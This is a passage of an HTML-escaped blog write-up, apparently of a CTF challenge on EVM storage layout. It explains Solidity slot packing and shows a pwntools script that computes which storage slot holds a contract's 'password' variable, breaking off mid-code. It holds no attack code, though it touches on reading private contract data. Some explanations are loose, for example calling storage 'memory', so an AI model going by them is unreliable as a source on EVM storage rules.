&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;    -   If it doesn&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;t&lt;&#x2F;span&gt;&lt;span&gt; stored on SLOT, answer 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Identification&lt;&#x2F;span&gt;&lt;span&gt; Required for Guest
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Question:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contract&lt;&#x2F;span&gt;&lt;span&gt; StorageChallenge7 {
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private key;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes4 private key_1;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes16 private key_2;
&lt;&#x2F;span&gt;&lt;span&gt;    address private owner;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private Token;
&lt;&#x2F;span&gt;&lt;span&gt;    address private immutable Investor;
&lt;&#x2F;span&gt;&lt;span&gt;    address private Courier;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 private immuatble password;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Answer:
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Apparently a question about EVM. The requirement is to find the index of the memory slot where the password is located.There are many articles or documents on the Internet that can be used to understand the memory allocation mechanism.&lt;&#x2F;p&gt;
&lt;p&gt;Simply put:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The bytes type occupies the number of bytes it declares. Uint occupies the declared number of bits divided by 8. The bool type occupies 1 byte, and the address type occupies 20 bytes.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If the free bytes in the previous slot are not enough to fill the current data, a new slot will be opened.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Each element of the array occupies a independent slot.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Variables declared with immutable are not stored in memory as constants.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;There are still some types and details not covered. But enough to solve this challenge.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;py&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-py &quot;&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import *
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;re
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_contract_content&lt;&#x2F;span&gt;&lt;span&gt;(stream&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    pattern &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt;}]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    match &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(pattern&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;stream&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;match:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;match&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;group&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Exception&lt;&#x2F;span&gt;&lt;span&gt;(stream&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return None
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_type_array_till_pwd&lt;&#x2F;span&gt;&lt;span&gt;(content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;string):
&lt;&#x2F;span&gt;&lt;span&gt;    line_array &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;content&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    type_array &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(line_array)):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;line_array[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;immutable&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;not in &lt;&#x2F;span&gt;&lt;span&gt;line_array[i]:
&lt;&#x2F;span&gt;&lt;span&gt;            type_array&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(line_array[i][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39; &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;immutable password&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;line_array[i]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;bool&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39; password;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;line_array[i]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;type_array
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Exception&lt;&#x2F;span&gt;&lt;span&gt;(content)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return None
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# References to https:&#x2F;&#x2F;www.8btc.com&#x2F;article&#x2F;6693684 (Chinese)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_slot_number_by_type_array&lt;&#x2F;span&gt;&lt;span&gt;(type_array&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;type_array:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;[&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;            slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= int&lt;&#x2F;span&gt;&lt;span&gt;(re&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\]&lt;&#x2F;span&gt;&lt;span&gt;]+)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;\]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;group&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;bytes32&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;uint256&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;address&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;20
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;20
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;bytes16&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;uint128&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;16
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;16
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;bytes8&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;uint64&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;bytes4&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;uint32&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;28&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                slot_number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;type &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;bool&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;31&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                current_slot_height &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1
